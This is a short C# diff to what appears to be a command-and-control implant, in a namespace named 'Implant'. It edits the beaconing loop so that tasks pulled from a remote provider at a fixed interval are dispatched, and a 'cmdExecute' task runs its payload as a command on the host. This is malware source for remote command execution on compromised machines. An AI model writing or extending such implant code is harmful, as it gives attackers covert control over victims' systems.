@@ -35,8 +35,11 @@ namespace Implant
             {
                 Thread.Sleep(this.config.pullInterval);
                 Task task = this.comprov.getNextTask();
-                Console.WriteLine(task.taskName);
-                //EXECUTE TASK
+                if (task.taskName == "cmdExecute")
+                {
+                   var result = Modules.CmdExecute.cmdExecute(task.payload);
+                }
+                Thread.Sleep(this.config.pullInterval);
             }
         }
 
